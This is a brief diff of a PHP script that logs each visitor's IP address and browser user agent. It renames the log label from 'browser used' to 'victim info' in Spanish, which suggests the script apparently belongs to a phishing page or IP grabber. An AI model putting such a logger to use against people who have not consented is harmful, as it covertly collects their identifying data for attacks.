@@ -12,7 +12,7 @@ else
     {
         $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
     }
-$useragent = "NAVEGADOR UTILIZADO: ";
+$useragent = "INFO. D VICTIMA:  ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $separator = "\n===============================";
 
